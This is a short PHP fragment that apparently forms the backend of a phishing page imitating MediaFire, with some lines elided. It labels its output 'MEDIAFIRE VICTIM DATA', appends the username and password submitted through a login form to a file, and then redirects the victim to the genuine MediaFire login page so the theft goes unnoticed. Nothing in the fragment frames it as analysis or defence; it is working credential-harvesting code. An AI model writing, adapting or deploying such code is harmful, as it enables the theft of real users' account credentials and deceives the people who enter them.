...
file_put_contents($file, print_r("\nMEDIAFIRE VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
...
file_put_contents($file, "Username: " . $_POST['login_email'] ."\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['login_pass'] ."\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://www.mediafire.com/login/"/> 
